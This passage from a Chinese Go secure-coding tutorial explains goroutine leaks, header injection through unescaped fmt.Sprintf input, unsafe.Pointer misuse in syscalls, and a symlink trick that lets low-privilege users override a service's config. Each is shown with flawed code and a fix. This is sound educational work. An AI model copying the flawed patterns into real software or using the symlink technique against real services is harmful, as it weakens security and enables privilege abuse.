</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在其基本用法中，我们可以向通道发送数据或从通道接收数据：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import (
    &quot;fmt&quot;
)
func mod(min int, max int, div int, signal chan int) {
    for n := min; n &lt;= max; n++ {
        if n%div == 0 {
            signal &lt;- n
        }
    }
}
func main() {
    fsignal := make(chan int)
    ssignal := make(chan int)
    go mod(15, 132, 14, fsignal)
    go mod(18, 132, 17, ssignal)

    fourteen, seventeen := &lt;-fsignal, &lt;-ssignal
    fmt.Println(&quot;Divisible by 14: &quot;, fourteen)
    fmt.Println(&quot;Divisible by 17: &quot;, seventeen)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该代码展示了如何使用 Goroutines 和 channels 来并发地计算两个数字范围内的数值，并找出能被特定数字整除的第一个数。</p><p>在这个例子中，我们有<em>阻塞、无缓冲的</em>通道。这两者是相辅相成的，因为无缓冲通道用于同步操作，程序在从通道接收到数据之前无法继续，因此它会阻止进一步的执行。</p><p>当无缓冲通道没有机会在其通道上发送数据时，就会发生 Goroutine 泄漏，因为其调用函数已经返回。这意味着挂起的 Goroutine 将保留在内存中，因为垃圾收集器将始终看到它在等待数据。举个例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func userChoice() string {
    time.Sleep(5 * time.Second)
    return &quot;right choice&quot;
}

func someAction() string {
    ch := make(chan string)
    timeout := make(chan bool)

    go func() {
        res := userChoice()
        ch &lt;- res
    }()
    go func() {
        time.Sleep(2 * time.Second)
        timeout &lt;- true
    }()
    select {
    case &lt;-timeout:
        return &quot;Timeout occured&quot;
    case userchoice := &lt;-ch:
        fmt.Println(&quot;User made a choice: &quot;, userchoice)
        return &quot;&quot;
    }
}
func main() {
    fmt.Println(someAction())
    time.Sleep(1 * time.Second)
    fmt.Println(&quot;Exiting&quot;)
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该代码通过使用 Goroutines 和 channels 来实现超时机制。它会等待用户选择（通过模拟的 userChoice 函数），如果用户选择在超时之前完成，则输出用户的选择；如果在指定时间内没有完成，则返回超时消息。</p><p>这个简单的示例用于模拟需要用户交互但超时值很低的功能。这意味着，除非我们的用户反应非常快，否则超时会在它做出选择之前发生，因此goroutine内的userChoice()函数将永远不会返回，从而导致泄漏。</p><h3 id="安全问题" tabindex="-1"><a class="header-anchor" href="#安全问题" aria-hidden="true">#</a> 安全问题</h3><p>此类漏洞的安全影响在很大程度上取决于具体的情况，但最有可能导致拒绝服务的情况。因此，只有当程序的生命周期足够长，并且启动了足够多的 goroutine 来大量消耗内存资源时，这才会成为问题。因此该问题主要是取决于用例和环境才会导致该漏洞产生更严重的影响。</p><h3 id="修复方式" tabindex="-1"><a class="header-anchor" href="#修复方式" aria-hidden="true">#</a> 修复方式</h3><p>最简单的解决方法是使用缓冲通道，这意味着 goroutines 具有非阻塞（异步）行为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>func someAction() string {
    ch := make(chan string, 1)
    timeout := make(chan bool)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fmt-sprintf" tabindex="-1"><a class="header-anchor" href="#fmt-sprintf" aria-hidden="true">#</a> fmt.Sprintf()</h2><p><strong>创建服务</strong></p><p>开发人员经常会做下面的事情：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>target := fmt.Sprintf(&quot;%s:%s&quot;, hostname, port)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这行代码乍一看是将主机名和端口组合成一个目标地址字符串，可能是为了稍后连接到服务器。看起来好像没有什么问题，但是如果hostname是IPV6地址会发生什么情况呢？如果在网络连接中使用生成的字符串时，识别到冒号它会假定它是协议分隔符，这就会导致异常。</p><p>为了避免这种问题，使用<code>net.JoinHostPort</code>可以用下面方式创建字符串：<code>[host]:port</code>，这是一个常用的连接字符串。</p><p><strong>未转义的控制字符</strong></p><p>最常用的格式化动词之一<code>fmt.Sprintf()</code>是我们熟悉的<code>%s</code>，它表示纯字符串。但是，如果在 REST API 调用中使用这种格式化的字符串，会发生什么情况，例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>URI := fmt.Sprintf(&quot;admin/updateUser/%s&quot;, userControlledParam)
resp, err := http.Post(filepath.Join(&quot;https://victim.site/&quot;, URI), &quot;application/json&quot;, body)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>%s</code>格式化动词表示纯字符串。用户可以注入控制字符，例如<code>\\0xA</code>换行符或<code>\\xB</code>制表符。在大多数情况下，这可能会导致各种header头注入漏洞。</p><p>因此我们有如下两种解决方案：</p><p>1.使用<code>%q</code>格式化动词，它将创建一个带编码控制字符的引号字符串</p><p>2.可以使用<code>strconv.Quote()</code>，它将引用字符串并编码控制字符</p><h2 id="unsafe包" tabindex="-1"><a class="header-anchor" href="#unsafe包" aria-hidden="true">#</a> Unsafe包</h2><p>GO语言中有一个包命名为unsafe，参考文档可知</p><p>https://pkg.go.dev/unsafe</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Package unsafe contains operations that step around the type safety of Go programs.
该包包含绕过GO程序类型安全的操作
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>从安全角度来看，其函数的使用用途是与syscall包一起使用，该操作非常常见，但是具体怎么回事，我们需要了解GO语言中的unsafe.Pointer和uintptr分别是什么。</p><p>简而言之，unsafe.Pointer 是一个 Go 内置类型（就像 string、map 和 chan 一样），这意味着它在内存中有一个关联的 Go 对象。基本上，任何 Go 指针都可以被转换为 unsafe.Pointer，这会使得编译器不对该对象执行边界检查。也就是说，开发人员可以告诉 Go 编译器绕过其类型安全。除此之外，uintptr 基本上只是 unsafe.Pointer 所指向的内存地址的整数表示。</p><p>那么再来看syscall，系统调用在编译后的Go的二进制文件运行时，这意味着它们在调用时需要原始指针，不知道如何处理完整的unsafe.Pointer对象。因此，当我们要 Go程序中调用syscall 时，我们需要将unsafe.Pointer转换为 uintptr，以丢弃 Go 对象在内存中具有的所有其他数据。这将把指针转换为指针所指向的存储器地址的简单整数表示:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rawPointer := uintptr(unsafe.Pointer(pointer))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>到这里相信大家对unsafe包有一定的原理了解。那么我们当前讨论的另一个重要内容为Go语言中有一个<code>non-generational concurrent, tri-color mark and sweep</code>垃圾回收器，我们无法知道GO在运行时何时会触发垃圾回收机制。</p><p>如果从 unsafe.Pointer 转换为 uintptr 并在 syscall 中使用时触发垃圾收集机制，我们可能会向系统调用传递一个完全不同的内存结构。这是因为垃圾收集器可能会在内存中移动对象，但它不会更新 uintptr，因此该地址可能与我们执行转换时完全不同。</p><h3 id="安全问题-1" tabindex="-1"><a class="header-anchor" href="#安全问题-1" aria-hidden="true">#</a> 安全问题</h3><p>同样，与其他Go异常类似，该漏洞的影响实际上取决于上下文。首先，由于垃圾回收而更改内存的机率非常低。但是，这种机率会随着我们拥有的 goroutine 数量和程序运行时间的增加而显著增加。最有可能的是，我们会得到一个无效指针解引用异常，但有可能将这样一个漏洞变成一个利用点。</p><h3 id="修复方式-1" tabindex="-1"><a class="header-anchor" href="#修复方式-1" aria-hidden="true">#</a> 修复方式</h3><p>使用如下代码可有效防御该问题：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), request, uintptr(unsafe.Pointer(pointer)))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>该代码使用Go语言的<code>syscall</code> 包中的 <code>Syscall</code> 函数来进行系统调用 <code>ioctl</code>，它允许程序与操作系统内核进行低级别的设备控制。具体来说，这段代码进行了一次 <code>ioctl</code> 调用，传递了文件描述符、请求代码和一个指向数据的指针，并接收返回的错误代码 <code>errno</code>。</p><h2 id="os-executable" tabindex="-1"><a class="header-anchor" href="#os-executable" aria-hidden="true">#</a> OS.EXECUTABLE()</h2><p><code>OS.EXECUTABLE()</code>函数如何处理符号链接取决于操作系统，我们可以看如下代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>func withoutEval() string {
    execBin, _ := os.Executable()
    path, err := filepath.Abs(filepath.Dir(execBin))
    if err != nil {
        log.Fatalf(&quot;error %v\\n&quot;, err)
    }
    fmt.Println(&quot;Path without filepath.EvalSymlinks():&quot;, path)
    return path
}

func printFile(path string) {
    fname := &quot;test.txt&quot;
    abspath := filepath.Join(path, fname)

    file, err := os.Open(abspath)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    fbytes := make([]byte, 16)
    bytesRead, err := file.Read(fbytes)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf(&quot;Number of bytes read: %d\\n&quot;, bytesRead)
    fmt.Printf(&quot;Bytes: %s\\n&quot;, fbytes)
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这段 Go 代码包括两个函数：<code>withoutEval</code> 和 <code>printFile</code>。<code>withoutEval</code> 函数获取当前可执行文件的目录路径，并打印它；<code>printFile</code> 函数打开一个指定目录中的文件，并读取其中的一部分内容，然后打印读取到的字节数和字节内容。</p><p>那么我们假设读取一个配置文件，该文件假设位于我们运行程序的同一目录中</p><p>当我们在没有任何符号链接的情况下运行该程序时，我们得到预期的行为，即配置文件将从主二进制文件所在的同一目录中读取</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bcloud@ubuntu:~/Desktop/sym$ echo BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB &gt; test.txt
bcloud@ubuntu:~/Desktop/sym$ ./sym
Executable location: /home/bcloud/Desktop/sym/sym
/home/bcloud/Desktop/sym/test.txt
Number of bytes read: 16
Bytes: BBBBBBBBBBBBBBBB
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>另外，假设我们的实际二进制文件位于其他目录中，并且我们通过符号链接运行我们的程序</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bcloud@ubuntu:~/Desktop/sym$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt; bin/test.txt
bcloud@ubuntu:~/Desktop/sym$ mv sym sym.bak
bcloud@ubuntu:~/Desktop/sym$ ln -s bin/sym sym
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 Linux 上，Go会跟踪符号链接，因此会尝试从以下位置读取配置文件/home/user/Documents/</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bcloud@ubuntu:~/Desktop/sym$ ./sym
Executable location: /home/bcloud/Desktop/sym/bin/sym
/home/bcloud/Desktop/sym/bin/test.txt
Number of bytes read: 16
Bytes: AAAAAAAAAAAAAAAA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="安全问题-2" tabindex="-1"><a class="header-anchor" href="#安全问题-2" aria-hidden="true">#</a> 安全问题</h3><p>假设我们有一个长期运行的 Go 二进制文件，例如服务或类似文件，位于受保护的位置，以防止低权限用户访问，并且配置文件规定了一些安全选项，例如对服务器或类似文件的主机证书验证。在 Windows 和 MacOS 上，即使对于权限较低的用户，我们也可以在可控制的位置创建指向此二进制文件的符号链接，并在那里添加修改后的配置文件，程序将在下次运行时读取该文件。实际上，这使得攻击者能够从低权限用户帐户覆盖那里的安全设置。</p><h3 id="修复方式-2" tabindex="-1"><a class="header-anchor" href="#修复方式-2" aria-hidden="true">#</a> 修复方式</h3><p>修复方法相对简单。我们只需要将结果传递<code>os.Executable()</code>给<code>os.EvalSymlinks()</code>。此函数将检查路径是否为符号链接，如果是，它将返回链接指向的绝对路径。</p>`,92);function E(H,F){const a=l("ExternalLinkIcon");return d(),o("div",null,[A,_,n("blockquote",null,[n("p",null,[n("a",B,[e("GitHub - Hardw01f/Vulnerability-goapp: Web application build Golang with Vulnerability"),s(a)])])]),S,n("blockquote",null,[n("p",null,[n("a",P,[e("GitHub - Hardw01f/Vulnerability-goapp: Web application build Golang with Vulnerability"),s(a)])])]),C,n("blockquote",null,[n("p",null,[n("a",T,[e("GitHub - Hardw01f/Vulnerability-goapp: Web application build Golang with Vulnerability"),s(a)])])]),N,n("p",null,[e("在之前的"),n("a",D,[e("justCTF"),s(a)]),e("中，出现了一道go题。题目原本的漏洞是由出题人发现的一个issuehttps://github.com/golang/go/issues/40940 加上其对fileServer一些代码的魔改组合的。")]),G])}const R=t(w,[["render",E],["__file","GoVul.html.vue"]]);export{R as default};
